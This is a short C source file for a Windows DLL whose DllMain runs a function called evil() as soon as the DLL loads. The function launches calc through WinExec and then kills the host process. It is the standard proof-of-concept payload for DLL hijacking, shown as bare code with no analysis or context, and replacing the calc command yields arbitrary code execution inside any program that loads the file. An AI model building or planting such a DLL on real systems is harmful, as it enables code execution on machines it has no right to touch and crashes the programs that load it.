#include <windows.h>
#define DLLIMPORT __declspec (dllexport)
 
int evil()
{
  WinExec("calc", 0);
  exit(0);
  return 0;
}
 
BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
  evil();
  return 0;
}
